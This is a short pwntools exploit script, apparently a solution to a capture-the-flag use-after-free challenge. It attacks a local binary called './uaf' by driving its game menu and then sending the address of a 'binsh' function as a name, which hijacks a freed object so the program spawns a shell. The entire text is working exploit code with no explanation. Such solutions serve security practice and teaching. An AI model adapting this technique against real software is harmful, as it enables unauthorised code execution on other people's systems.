from pwn import *
e = ELF('./uaf')
binsh_addr = e.symbols['binsh']
log.info('binsh_addr : ' + hex(binsh_addr))
p = process('./uaf')
p.recv()
p.sendline('2')
log.info('setting')
p.recv()
p.sendline('100')
log.info('damage : 100')
p.recv()
p.sendline('1')
log.info('fight')
p.recv()
p.sendline('1')
log.info('hit')
p.recv()
p.sendline(p32(binsh_addr))
log.info('name : ' + p32(binsh_addr))
p.recv()
p.sendline('1')
log.info('fight')
print p.recv()
